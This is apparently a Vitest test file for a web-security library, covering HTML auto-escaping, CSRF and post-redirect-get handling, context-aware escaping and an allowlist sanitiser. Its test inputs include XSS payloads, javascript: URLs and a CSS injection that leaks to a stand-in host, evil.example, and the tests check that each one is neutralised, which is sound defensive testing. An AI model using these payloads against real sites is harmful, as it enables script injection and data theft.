// @vitest-environment happy-dom
import { describe, expect, it } from 'vitest';
import { html, raw, render } from '../../src/lib/html-template.ts';
import {
  createServer,
  formatRequest,
  formatResponse,
  parseForm,
  validate,
} from '../../src/lib/mini-server.ts';
import { analyse, jsString, safeCssColor } from '../../src/lib/escape-contexts.ts';
import { sanitizeHtml } from '../../src/lib/sanitize.ts';

const XSS = '<img src=x onerror=alert(1)>';

describe('auto-escaping html template', () => {
  it('escapes interpolations but not nested html fragments or raw()', () => {
    const name = XSS;
    const out = render(html`<p>${name}</p>${html`<b>${'&'}</b>`}${raw('<hr>')}`);
    expect(out).toBe('<p>&lt;img src=x onerror=alert(1)&gt;</p><b>&amp;</b><hr>');
  });
  it('renders arrays and skips null, undefined and false', () => {
    const items = ['a', '<b>'].map((x) => html`<li>${x}</li>`);
    expect(render(html`<ul>${items}</ul>${null}${false}`)).toBe(
      '<ul><li>a</li><li>&lt;b&gt;</li></ul>',
    );
  });
});

describe('mini server: forms, PRG and CSRF', () => {
  const post = (body: string) => ({ method: 'POST' as const, path: '/contact', body });
  const valid =
    'csrf=k3v9-demo-token&name=Asha&email=asha%40example.com&message=Hello%20there%2C%20friend';

  it('parses urlencoded bodies', () => {
    expect(parseForm('a=1&b=two+words&c=%3Cx%3E')).toEqual({ a: '1', b: 'two words', c: '<x>' });
  });

  it('validates on the server', () => {
    expect(validate({ name: '', email: 'nope', message: 'short' })).toEqual({
      name: 'Enter your name',
      email: 'Enter an email address like name@example.com',
      message: 'Write a message of at least 10 characters',
    });
  });

  it('serves the form with a CSRF token and security headers', () => {
    const res = createServer().handle({ method: 'GET', path: '/contact' });
    expect(res.status).toBe(200);
    expect(res.headers['Content-Type']).toBe('text/html; charset=utf-8');
    expect(res.headers['Content-Security-Policy']).toContain("object-src 'none'");
    expect(res.body).toContain('name="csrf" value="k3v9-demo-token"');
  });

  it('rejects a missing or wrong CSRF token with 403', () => {
    expect(createServer().handle(post('name=x')).status).toBe(403);
  });

  it('re-renders errors with 422, keeps input escaped, and links the summary to fields', () => {
    const res = createServer().handle(
      post(`csrf=k3v9-demo-token&name=${encodeURIComponent(XSS)}&email=x`),
    );
    expect(res.status).toBe(422);
    expect(res.body).toContain('value="&lt;img src=x onerror=alert(1)&gt;"');
    expect(res.body).not.toContain(XSS);
    expect(res.body).toContain('<a href="#f-email">');
    expect(res.body).toContain('aria-invalid="true"');
    expect(res.body).toContain('<title>Error: Contact us</title>');
  });

  it('answers a valid POST with 303 See Other, and the GET shows the result', () => {
    const server = createServer();
    const res = server.handle(post(valid));
    expect(res.status).toBe(303);
    expect(res.headers.Location).toBe('/contact/thanks');
    const page = server.handle({ method: 'GET', path: res.headers.Location ?? '' });
    expect(page.body).toContain('Thanks, Asha');
    expect(server.messages).toHaveLength(1);
  });

  it('without PRG, a refresh re-sends the POST and duplicates the message', () => {
    const server = createServer({ prg: false });
    server.handle(post(valid));
    server.handle(post(valid)); // the browser's "Confirm form resubmission" → yes
    expect(server.messages).toHaveLength(2);
  });

  it('returns 404 for unknown paths and formats raw HTTP', () => {
    const res = createServer().handle({ method: 'GET', path: '/nope' });
    expect(res.status).toBe(404);
    expect(formatResponse(res).split('\n')[0]).toBe('HTTP/1.1 404 Not Found');
    expect(formatRequest(post('a=1')).split('\n')).toContain(
      'Content-Type: application/x-www-form-urlencoded',
    );
  });
});

describe('escaping by output context', () => {
  const byId = (value: string) => Object.fromEntries(analyse(value).map((r) => [r.id, r]));

  it('is safe in text and quoted attributes', () => {
    const r = byId('"><script>alert(1)</script>');
    expect(r.text?.danger).toBeUndefined();
    expect(r.attr?.naive).toBe('<input value="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">');
  });

  it('flags unquoted attributes, javascript: URLs, backslashes in scripts and CSS injection', () => {
    expect(byId('x onfocus=alert(1)').unquoted?.danger).toBeDefined();
    expect(byId('javascript:alert(1)').href?.danger).toBeDefined();
    expect(byId('java\tscript:alert(1)').href?.danger).toBeDefined();
    expect(byId('javascript:alert(1)').href?.correct).toBe('<a href="#">link</a>');
    expect(byId('\\').script?.danger).toMatch(/backslash/);
    expect(byId('red; background: url(//evil.example/?leak)').style?.danger).toBeDefined();
  });

  it('serialises safely into scripts and validates CSS colours', () => {
    expect(jsString('</script><b>"\\')).toBe('"\\u003c/script>\\u003cb>\\"\\\\"');
    expect(safeCssColor('#c2410c')).toBe('#c2410c');
    expect(safeCssColor('oklch(0.6 0.2 40)')).toBe('oklch(0.6 0.2 40)');
    expect(safeCssColor('red; background: url(x)')).toBe('inherit');
  });
});

describe('allowlist sanitiser', () => {
  it('drops scripts and handlers, unwraps unknown tags, hardens links', () => {
    const { html: out, removed } = sanitizeHtml(
      '<p onclick="x()">Hi <marquee>there</marquee><script>alert(1)</script></p>' +
        '<a href="javascript:alert(1)">bad</a><a href="https://ok.example" style="x">ok</a><img src=x onerror=alert(1)>',
    );
    expect(out).toBe(
      '<p>Hi there</p><a rel="ugc nofollow noopener">bad</a><a href="https://ok.example" rel="ugc nofollow noopener">ok</a>',
    );
    expect(removed).toEqual(
      expect.arrayContaining([
        '<script> and its contents',
        '<marquee> (kept its text)',
        'onclick="x()" on <p>',
        'unsafe href "javascript:alert(1)"',
        '<img> and its contents',
      ]),
    );
  });

  it('keeps allowed formatting untouched', () => {
    const safe = '<p><strong>Bold</strong> and <code>code</code></p><ul><li>one</li></ul>';
    expect(sanitizeHtml(safe).html).toBe(safe);
  });
});
